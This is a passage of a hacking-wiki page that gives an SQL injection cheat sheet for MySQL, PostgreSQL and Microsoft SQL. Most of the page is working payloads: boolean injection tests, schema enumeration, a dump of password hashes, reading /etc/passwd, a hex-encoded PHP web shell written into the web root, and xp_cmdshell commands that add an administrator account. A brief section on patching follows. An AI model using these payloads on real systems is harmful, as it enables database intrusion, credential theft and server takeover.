<ul><li> <a href="#Privileged_Mysql_.28Any_version.29_User">Writing a shell to the document root</a> (<b>MySQL</b>-specific)
</li></ul>
<h1> <span class="mw-headline" id="Cheat_Sheets"> Cheat Sheets </span></h1>
<h3> <span class="mw-headline" id="Vulnerability_testing">Vulnerability testing</span></h3>
<div style="padding: .2em .3em; margin: .2em .2em; background-color: #98AFC7; border: solid 1px #25383C; font-size: 107%;"><strong>Protip:</strong> <b><i>Using the compacted best true and false statements for compatibility and evasion here.  If problems occur, recommended reading is <a href="#Simple_Remote_Tests_for_SQL_Injection_Vulnerabilities">remote testing</a> or <a href="#Bypassing_Modern_SQL_Injection_Security_Measures">defeating sql injection filters</a>.</i></b></div>
<p><br />
</p>
<h4> <span class="mw-headline" id="Universal_true_and_false_statements">Universal true and false statements</span></h4>
<div style="padding: .2em .3em; margin: .2em .2em; background-color: #FFF6BF; border: solid 2px #FFD324; font-size: 107%;"><b>Notice:</b> <i>The accuracy of this stuff has been ensured.  If missing any universal testing operators, please <a href="/IRC" title="IRC" class="mw-redirect">let us know.</a></i></div>
<ul><li> <i><b>Standard operators</b> (<b>Universal</b>):</i>
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<b>True</b>:  <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">AND</span> <span class="nu0">230984752</span> <span class="sy0">=</span> <span class="nu0">230984752</span></pre></div></div>
<b>False</b>: <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">AND</span> <span class="nu0">1023947182234</span> <span class="sy0">=</span> <span class="nu0">4382616621386497</span></pre></div></div>
</td></tr></table>
<ul><li> <i>The <b>Between ... And ...</b> operators (<b>Universal</b>):</i>
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<b>True</b>:  <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">AND</span> <span class="nu0">238829</span> <span class="kw1">BETWEEN</span> <span class="nu0">238826</span> <span class="kw1">AND</span> <span class="nu0">238927</span></pre></div></div>
<b>False</b>: <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">AND</span> <span class="nu0">328961</span> <span class="kw1">BETWEEN</span> <span class="nu0">928172</span> <span class="kw1">AND</span> <span class="nu0">986731</span></pre></div></div>
</td></tr></table>
<ul><li> <i>The <b>LIKE</b> operator (<b>Universal</b>):</i>
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<b>True</b>:  <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">AND</span> <span class="st0">'sqltest'</span> <span class="kw1">LIKE</span> <span class="st0">'sql%'</span></pre></div></div>
<b>False</b>: <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">AND</span> <span class="st0">'sqltest'</span> <span class="kw1">LIKE</span> <span class="st0">'not true'</span></pre></div></div>
</td></tr></table>
<ul><li> <i>The <b>REGEXP</b> operator (<b>RLIKE in Microsoft SQL and the "~" character in PostgreSQL, Universal</b>):</i>
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<b>True</b>:  <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">AND</span> <span class="st0">'sqltest'</span> <span class="kw1">REGEXP</span> <span class="st0">'^sql'</span></pre></div></div>
<b>False</b>: <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">AND</span> <span class="st0">'sqltest'</span> <span class="kw1">REGEXP</span> <span class="st0">'^false'</span></pre></div></div>
</td></tr></table>
<h2> <span class="mw-headline" id="MySQL_syntax_reference">MySQL syntax reference</span></h2>
<ul><li> Comment notation: 
</li></ul>
<pre> /*   [*/]
&#160;%23 (# urlencoded) 
 --[space]
</pre>
<ul><li> Handy functions, statements, and Environment Variables:
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1">  version<span class="br0">&#40;</span><span class="br0">&#41;</span>
  <span class="kw1">USER</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
  current_database<span class="br0">&#40;</span><span class="br0">&#41;</span>
  <span class="kw1">COUNT</span><span class="br0">&#40;</span><span class="br0">&#91;</span>column_name<span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="kw1">FROM</span> <span class="br0">&#91;</span><span class="kw1">TABLE_NAME</span><span class="br0">&#93;</span>
  <span class="kw1">LENGTH</span><span class="br0">&#40;</span><span class="br0">&#91;</span>column_name<span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="kw1">FROM</span> <span class="br0">&#91;</span><span class="kw1">TABLE_NAME</span><span class="br0">&#93;</span> <span class="br0">&#91;</span><span class="kw1">WHERE</span> <span class="kw1">OR</span> <span class="kw1">LIMIT</span><span class="br0">&#93;</span>
  substr<span class="br0">&#40;</span><span class="br0">&#91;</span>query<span class="br0">&#93;</span><span class="sy0">,</span><span class="br0">&#91;</span>byte_counter<span class="br0">&#93;</span><span class="sy0">,</span><span class="nu0">1</span><span class="br0">&#41;</span> 
  concat<span class="br0">&#40;</span><span class="br0">&#91;</span>column_name<span class="br0">&#93;</span><span class="sy0">,</span>0x2f<span class="sy0">,</span><span class="br0">&#91;</span>column_name<span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="kw1">FROM</span> <span class="br0">&#91;</span><span class="kw1">TABLE_NAME</span><span class="br0">&#93;</span> <span class="br0">&#91;</span><span class="kw1">WHERE</span> <span class="kw1">OR</span> <span class="kw1">LIMIT</span><span class="br0">&#93;</span>
  group_concat<span class="br0">&#40;</span><span class="br0">&#91;</span>column_name<span class="br0">&#93;</span><span class="sy0">,</span>0x2f<span class="sy0">,</span><span class="br0">&#91;</span>column_name<span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="kw1">FROM</span> <span class="br0">&#91;</span><span class="kw1">TABLE_NAME</span><span class="br0">&#93;</span> <span class="br0">&#91;</span><span class="kw1">WHERE</span> <span class="kw1">OR</span> <span class="kw1">LIMIT</span><span class="br0">&#93;</span></pre></div></div>
</td></tr></table>
<ul><li> The need for quotes can be evaded by using the 0x[hex] operator.  An example is "select 0x6a6a".  The output is "jj", same as if "select 'jj'" is run.
</li></ul>
<h3> <span class="mw-headline" id="Mysql_versions_.3E.3D_5_user_schema_mapping_.28unprivileged.29">Mysql versions &gt;= 5 user schema mapping (unprivileged)</span></h3>
<ul><li> Show Databases Equivilent:
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"> <span class="kw1">SELECT</span> schema_name <span class="kw1">FROM</span> information_schema<span class="sy0">.</span>schemata <span class="kw1">LIMIT</span> <span class="nu0">1</span> offset <span class="nu0">0</span></pre></div></div>
</td></tr></table>
<ul><li> Show Tables Equivilent
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"> <span class="kw1">SELECT</span> <span class="kw1">TABLE_NAME</span> <span class="kw1">FROM</span> information_schema<span class="sy0">.</span><span class="kw1">TABLES</span> <span class="kw1">WHERE</span> table_schema<span class="sy0">=</span><span class="kw1">DATABASE</span><span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="kw1">LIMIT</span> <span class="nu0">1</span> offset <span class="nu0">0</span></pre></div></div>
</td></tr></table>
<ul><li> Show Fields Equivilent
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">SELECT</span> column_name <span class="kw1">FROM</span> information_schema<span class="sy0">.</span><span class="kw1">COLUMNS</span> <span class="kw1">WHERE</span> table_schema<span class="sy0">=</span><span class="kw1">DATABASE</span><span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="kw1">AND</span> <span class="kw1">TABLE_NAME</span><span class="sy0">=</span><span class="br0">&#40;</span><span class="br0">&#91;</span><span class="kw1">TABLE</span> query<span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="kw1">LIMIT</span> <span class="nu0">1</span> offset <span class="nu0">0</span></pre></div></div>
</td></tr></table>
<h3> <span class="mw-headline" id="Privileged_MySQL_.28any_version.29_user">Privileged MySQL (any version) user</span></h3>
<ul><li> Get mysql usernames and password hashes:
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"> <span class="kw1">SELECT</span> concat<span class="br0">&#40;</span><span class="kw1">USER</span><span class="sy0">,</span>0x2f<span class="sy0">,</span>password<span class="br0">&#41;</span> <span class="kw1">FROM</span> mysql<span class="sy0">.</span><span class="kw1">USER</span> <span class="kw1">LIMIT</span> <span class="nu0">1</span></pre></div></div>
</td></tr></table>
<ul><li> Grab /etc/passwd
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">SELECT</span> load_file<span class="br0">&#40;</span>0x2f6574632f706173737764<span class="br0">&#41;</span></pre></div></div>
</td></tr></table>
<ul><li> Dump a small php shell (&lt;?php system($_GET['id']);&#160;?&gt;) into /var/www/localhost/htdocs
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"> <span class="kw1">SELECT</span> 0x3c3f7068702073797374656d28245f4745545b276964275d293b203f3e <span class="kw1">INTO</span> <span class="kw1">OUTFILE</span> <span class="st0">'/var/www/localhost/htdocs/.shell.php'</span></pre></div></div>
</td></tr></table>
<h2> <span class="mw-headline" id="PostgreSQL_syntax_reference">PostgreSQL syntax reference</span></h2>
<p>Handy functions &amp; Environment Variables include:
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1">  current_database<span class="br0">&#40;</span><span class="br0">&#41;</span>
  <span class="kw1">CURRENT_USER</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
  chr<span class="br0">&#40;</span><span class="br0">&#41;</span>
  ascii<span class="br0">&#40;</span><span class="br0">&#41;</span>
  substr<span class="br0">&#40;</span><span class="br0">&#41;</span></pre></div></div>
</td></tr></table>
<p><i><b>Quick and common string concatenations:</b></i>
</p>
<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
<tr>
<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
</td>
<td>String concatenation in postgresql is done using the two pipe operators side by side, e.g. <b>"select chr(97)&#x7c;&#x7c;chr(97)"</b> is the same as <b>"select 'aa'"</b>.
</td></tr></table>
<table class="wikitable" width="100%">
<tr>
<td>
<ul><li> Congruent to <b>select 'BASE TABLE';</b>:<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1">  <span class="br0">&#40;</span><span class="kw1">SELECT</span> CHR<span class="br0">&#40;</span><span class="nu0">66</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">65</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">83</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">69</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">32</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">84</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">65</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">66</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">76</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">69</span><span class="br0">&#41;</span><span class="br0">&#41;</span></pre></div></div>
</li><li> Congruent to <b>select 'pg_catalog';</b>:<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1">  <span class="br0">&#40;</span><span class="kw1">SELECT</span> CHR<span class="br0">&#40;</span><span class="nu0">112</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">103</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">95</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">99</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">97</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">116</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">97</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">108</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">111</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">103</span><span class="br0">&#41;</span><span class="br0">&#41;</span></pre></div></div>
</li><li> Congruent to <b>select 'information_schema';</b>:<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1">  <span class="br0">&#40;</span><span class="kw1">SELECT</span> CHR<span class="br0">&#40;</span><span class="nu0">105</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">110</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">102</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">111</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">114</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">109</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">97</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">116</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">105</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">111</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">110</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">95</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">115</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">99</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">104</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">101</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">109</span><span class="br0">&#41;</span><span class="sy0">||</span>CHR<span class="br0">&#40;</span><span class="nu0">97</span><span class="br0">&#41;</span><span class="br0">&#41;</span></pre></div></div>
</li></ul>
</td></tr></table>
<h3> <span class="mw-headline" id="PostgreSQL_schema_mapping">PostgreSQL schema mapping</span></h3>
<table class="wikitable" width="100%">
<tr>
<td>
<ul><li> <b>\dn equivilent</b>:
</li></ul>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1">  <span class="kw1">SELECT</span> schema_name <span class="kw1">FROM</span> information_schema<span class="sy0">.</span>schemata <span class="kw1">WHERE</span> catalog_name<span class="sy0">=</span>current_database<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="kw1">LIMIT</span> <span class="nu0">1</span> offset <span class="nu0">0</span></pre></div></div>
<ul><li> <b>\dt equivilent</b>:
</li></ul>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1">  <span class="kw1">SELECT</span> <span class="kw1">TABLE_NAME</span> <span class="kw1">FROM</span> information_schema<span class="sy0">.</span><span class="kw1">TABLES</span> table_type<span class="sy0">=</span><span class="st0">'BASE TABLE'</span> <span class="kw1">AND</span> table_schema<span class="sy0">=</span><span class="br0">&#40;</span><span class="br0">&#91;</span>schema_query<span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="kw1">AND</span> catalog_name<span class="sy0">=</span>current_database<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="kw1">LIMIT</span> <span class="nu0">1</span> offset <span class="nu0">0</span></pre></div></div>
<ul><li> <b>\d [table_name] equivilent</b>:
</li></ul>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1">  <span class="kw1">SELECT</span> column_name <span class="kw1">FROM</span> information_schema<span class="sy0">.</span><span class="kw1">COLUMNS</span> <span class="kw1">WHERE</span> <span class="kw1">TABLE_NAME</span><span class="sy0">=</span><span class="br0">&#40;</span><span class="br0">&#91;</span>table_query<span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="kw1">AND</span> table_schema<span class="sy0">=</span><span class="br0">&#40;</span>schema_query<span class="br0">&#41;</span> <span class="kw1">AND</span> catalog_name<span class="sy0">=</span>current_database<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="kw1">LIMIT</span> <span class="nu0">1</span> offset <span class="nu0">0</span></pre></div></div>
</td></tr></table>
<h2> <span class="mw-headline" id="Microsoft_SQL_syntax_reference">Microsoft SQL syntax reference</span></h2>
<ul><li> Handy functions, statements, and Environment Variables:
</li></ul>
<pre> database()
 ascii()
 substring()
 WAIT ... FOR DELAY
 @@version
</pre>
<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
<tr>
<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
</td>
<td>String concatenation is preformed in Microsoft SQL via the <b>+</b> character.
</td></tr></table>
<h3> <span class="mw-headline" id="Microsoft_SQL_schema_mapping_.28unprivileged.29">Microsoft SQL schema mapping (unprivileged)</span></h3>
<table class="wikitable" width="100%">
<tr>
<td>
<ul><li> Obtaining the first table:
</li></ul>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1">  <span class="kw1">SELECT</span> top <span class="nu0">1</span> <span class="kw1">TABLE_NAME</span> <span class="kw1">FROM</span> <span class="br0">&#40;</span><span class="kw1">SELECT</span> top <span class="nu0">1</span> <span class="kw1">TABLE_NAME</span> <span class="kw1">FROM</span> information_schema<span class="sy0">.</span><span class="kw1">COLUMNS</span> <span class="kw1">WHERE</span> table_catalog<span class="sy0">=</span>@@<span class="kw1">DATABASE</span> <span class="kw1">GROUP</span> <span class="kw1">BY</span> <span class="kw1">TABLE_NAME</span> <span class="kw1">ORDER</span> <span class="kw1">BY</span> <span class="kw1">TABLE_NAME</span> <span class="kw1">DESC</span><span class="br0">&#41;</span> sq 
    <span class="kw1">GROUP</span> <span class="kw1">BY</span> <span class="kw1">TABLE_NAME</span> <span class="kw1">ORDER</span> <span class="kw1">BY</span> <span class="kw1">TABLE_NAME</span> <span class="kw1">ASC</span></pre></div></div>
<ul><li> Obtaining the first column:
</li></ul>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1">  <span class="kw1">SELECT</span> top <span class="nu0">1</span> column_name <span class="kw1">FROM</span> <span class="br0">&#40;</span><span class="kw1">SELECT</span> top <span class="nu0">1</span> column_name <span class="kw1">FROM</span> information_schema<span class="sy0">.</span><span class="kw1">COLUMNS</span> <span class="kw1">WHERE</span> table_catalog<span class="sy0">=</span>@@<span class="kw1">DATABASE</span> <span class="kw1">AND</span> <span class="kw1">TABLE_NAME</span><span class="sy0">=</span><span class="st0">'[table_name]'</span> 
    <span class="kw1">GROUP</span> <span class="kw1">BY</span> column_name <span class="kw1">ORDER</span> <span class="kw1">BY</span> column_name <span class="kw1">ASC</span><span class="br0">&#41;</span> sq <span class="kw1">GROUP</span> <span class="kw1">BY</span> column_name <span class="kw1">ORDER</span> <span class="kw1">BY</span> column_name <span class="kw1">DESC</span></pre></div></div>
</td></tr></table>
<h3> <span class="mw-headline" id="Privileged_microsoft_SQL_injection">Privileged microsoft SQL injection</span></h3>
<ul><li> Command Execution:
</li></ul>
<pre>;%0a%0dexec master..xp_cmdshell 'net user hacker hackerpassword /add';--
;%0a%0dexec master..xp_cmdshell 'net localgroup administrators hacker /add';--
</pre>
<ul><li> Obtaining <a href="/Database" title="Database">database</a> <a href="/Authentication_credential" title="Authentication credential">authentication credentials</a>:
</li></ul>
<pre>SELECT * FROM sysobjects WHERE type='U'
</pre>
<h1> <span class="mw-headline" id="Patching_SQL_Injection_Vulnerabilities">Patching SQL Injection Vulnerabilities</span></h1>
<table style="border: 1px solid black; background-color: lavender; width: 100%">
<th style="background-color: #9C7; padding: 4px">The security analyst says</th>
<tr><td style="background-color: white"><center><b>"<i>Either sanitize the inputs properly, or use prepared statements.</b>
Obviously, <a href="#Modern_day_SQL_Injection_Obstacles_and_Countermeasures">today's countermeasures for sql injection</a> are <a href="#Bypassing_Modern_SQL_Injection_Security_Measures">easily bypassed</a>.</i>"<b></center></td></tr></b>
</table>
<ul><li> <b><a href="/Ruby" title="Ruby">Ruby</a> input sanitizing</b>:
</li></ul>
<pre>  <u>[Sanitizes For]  | [Type]  |  [Engine]  | [Example]</u>
XSS, SQL Injection | String  | Any        | var = HTMLEntities.encode(var,:basic:)
SQL Injection      | String  | MySQL      | var = Mysql.escape_string(var)
SQL Injection      | String  | PostgreSQL | var = PGconn.escape_string(var)
XSS, SQL Injection | Integer | Any        | var = var.to_i
</pre>
<ul><li> <b><a href="/PHP" title="PHP">PHP</a> input sanitizing</b>:
</li></ul>
<pre>  <u>[Sanitizes For]  | [Type]  |  [Engine]  | [Example]</u>
XSS, SQL Injection | String  | Any        | $var = htmlentities($_GET['var'],ENT_QUOTES);
SQL Injection      | String  | MySQL      | $var = mysql_real_escape_string($_GET['var']);
SQL Injection      | String  | PostgreSQL | $var = pg_escape_string($_GET['var']);
XSS, SQL Injection | Integer | Any        | $var = (int)$_GET['var'];
</pre>
<ul><li> <b><a href="/Python" title="Python">Python</a> input sanitizing</b>:
</li></ul>
<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
<tr>
<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
</td>
<td>Python2.4 and newer defaults to using prepared statements.  Thus, this table only refers to legacy applications built in python versions &lt; 2.4 that require manual sanitizing.
</td></tr></table>   <u>[Sanitizes For]  | [Type]  |  [Engine]  | [Example]</u>
<pre>XSS, SQL Injection | String  | Any        | var = urllib.urlencode(var)
SQL Injection      | String  | MySQL      | var = conn.escape_string(var)
SQL Injection      | String  | PostgreSQL | var = psycopg2.extensions.adapt(var)
XSS, SQL Injection | Integer | Any        | var = int(var)
</pre>
<p><br />
</p>
<div style="padding: .2em .3em; margin: .2em .2em; background-color: #98AFC7; border: solid 1px #25383C; font-size: 107%;"><strong>Protip:</strong> Most researchers to date considers the use of <b>prepared statements</b> to be perfectly safe due to the basic differences in query implementations.
<table class="wikitable" width="100%">
<tr>
<td>
<ul><li> Prepared statements typically use a <b>PDO</b> library and use the <b><a href="/Binary" title="Binary" class="mw-redirect">binary</a></b> protocol rather than the <b>socket</b> <a href="/Protocols" title="Protocols" class="mw-redirect">protocol</a> for interacting with the server.  
</li><li> A statement must be prepared <a href="/SQL_Backdoors#Subprocedures" title="SQL Backdoors" class="mw-redirect">knowing the number and locations of inputs, then executed using inputs as parameters</a>.
</li></ul>
</td></tr></table>
</div>
<p><br />
</p>
<h1> <span class="mw-headline" id="SQL_Injection_Tools"> SQL Injection Tools </span></h1>
<ul><li> <a href="/Vanguard" title="Vanguard">Vanguard</a>
</li><li> <a href="/GScrape" title="GScrape">GScrape</a> - Now updated for <a href="/SQL" title="SQL">SQL</a> injection.
</li><li> <a href="/Mysqli-blindutils" title="Mysqli-blindutils">mysqli-blindutils</a>
</li></ul>
<dl><dd><ul><li><a href="/SQL_injection/mysqli-blindutils/sqli-p.pl" title="SQL injection/mysqli-blindutils/sqli-p.pl">sqli-p.pl</a>
</li><li><a href="/SQL_injection/mysqli-blindutils/sqli-slee.py" title="SQL injection/mysqli-blindutils/sqli-slee.py">sqli-slee.py</a>
</li><li><a href="/SQL_injection/mysqli-blindutils/sqli-hap.py" title="SQL injection/mysqli-blindutils/sqli-hap.py">sqli-hap.py</a>
</li></ul>
</dd></dl>
<h1> <span class="mw-headline" id="Further_reading"> Further reading </span></h1>
<p>Related Content:
</p>
<ul><li> <a href="/SQL_Backdoors" title="SQL Backdoors" class="mw-redirect">SQL Backdoors</a>
</li><li> <a href="/MySQL" title="MySQL">MySQL</a>
</li><li> <a href="/Programming_language" title="Programming language" class="mw-redirect">Programming language</a> specifications: <a href="/Perl" title="Perl">Perl</a>,<a href="/Python" title="Python">Python</a>,<a href="/C" title="C">C</a>,<a href="/C%2B%2B" title="C++" class="mw-redirect">C++</a>
</li></ul>
<p>External Links:
</p>
<ul><li> <a href="http://dev.mysql.com/doc/refman/4.1/en/index.html" class="external text" rel="nofollow">MySQL 3/4 Reference Manual</a>
</li><li> <a href="http://dev.mysql.com/doc/refman/5.0/en/" class="external text" rel="nofollow">MySQL 5 Reference Manual</a>
</li><li> <a href="http://docs.oracle.com/cd/E19957-01/mysql-refman-6.0/" class="external text" rel="nofollow">MySQL 6 Reference Manual</a>
</li></ul>
<ul><li> <a href="http://www.postgresql.org/docs/7.4/static/index.html" class="external text" rel="nofollow">Postgres 7 Reference Manual</a>
</li><li> <a href="http://www.postgresql.org/docs/8.2/static/index.html" class="external text" rel="nofollow">Postgres 8 Reference Manual</a>
</li><li> <a href="http://www.postgresql.org/docs/9.1/static/index.html" class="external text" rel="nofollow">Postgres 9 Reference Manual</a>
</li></ul>
<ul><li> <a href="http://msdn.microsoft.com/en-us/library/bb545450.aspx" class="external text" rel="nofollow">MSDN SQL Server Resources</a>
</li></ul>
<center><script type="text/javascript">
function toggle() {
   $('#display_text').html($('#hidden_display').html());
   $('#hidetext').html($('#hide_msg').html());
   $('#hidetext').attr('onClick','vape();');
}
function vape() {
   $('#display_text').html('');
   $('#hidetext').html($('#show_msg').html());
   $('#hidetext').attr('onClick','toggle();');
}
</script><div style="width:40%; border: 1px solid #000; padding:0px 0px 0px 0px;">SQL injection is part of a series on <a href="/Exploitation" title="Exploitation" class="mw-redirect">exploitation</a>.<br />
<a id='hidetext' onclick="toggle();"><b>[ CrackMe ]</b></a><br /><div id="display_text"></div></div>
<div id="hidden_display" style="display:none; height:1px; width:1px">
<div style="padding:2px;">
<p><b><a href="/Web_Exploitation" title="Web Exploitation" class="mw-redirect">Web Exploitation</a></b><br />
<a href="/XSS" title="XSS">XSS</a> &#8226; <strong class="selflink">SQL injection</strong> &#8226; <a href="/CSRF" title="CSRF">CSRF</a> &#8226; <a href="/XSRF" title="XSRF">XSRF</a> &#8226; <a href="/Cookies" title="Cookies">Cookies</a> &#8226; <a href="/File_Inclusion" title="File Inclusion">File Inclusion</a> &#8226; <a href="/Command_Injection" title="Command Injection">Command Injection</a> <br />
<a href="/XSCF" title="XSCF">XSCF</a> &#8226; <a href="/Cold_Fusion_Hacking" title="Cold Fusion Hacking" class="mw-redirect">Cold Fusion Hacking</a> &#8226; <a href="/RoR_Patching#Params_Injection_.26_Mass_Assignment_Abuse" title="RoR Patching">Mass Assignment Abuse</a> &#8226; <a href="/Lfi_autopwn.pl" title="Lfi autopwn.pl">Lfi_autopwn.pl</a> <br />
<a href="/MySql_5_Enumeration" title="MySql 5 Enumeration" class="mw-redirect">Mysql5 Enumerator</a> &#8226; <a href="/Vanguard" title="Vanguard">Vanguard</a>
</p><p><b>Software Exploitation</b><br />
<a href="/Buffer_Overflows" title="Buffer Overflows" class="mw-redirect">Buffer Overflows</a> &#8226; <a href="/Ascii_shellcode" title="Ascii shellcode">ascii shellcode(32 bit)</a> &#8226; <a href="/Alphanumeric_shellcode" title="Alphanumeric shellcode" class="mw-redirect">alphanumeric shellcode(64-bit)</a> &#8226; <a href="/Bleeding_Life" title="Bleeding Life">Bleeding Life</a> &#8226; <a href="/Unsafe_string_replacement" title="Unsafe string replacement">Unsafe string replacement</a> &#8226; <a href="/Filter_bypass" title="Filter bypass">filter bypass</a> &#8226; <a href="/IDS_evasion" title="IDS evasion">IDS evasion</a> &#8226; <a href="/Privilege_escalation" title="Privilege escalation">privilege escalation</a>
</p>
</div></div><div style="visibility:hidden;height:1px;width:1px;"><div id="hide_msg" style="visibility:hidden;"><b>[ PatchMe ]</b></div><div id="show_msg" style="visibility:hidden;"><b>[ CrackMe ]</b></div></div></center><center>
<p>
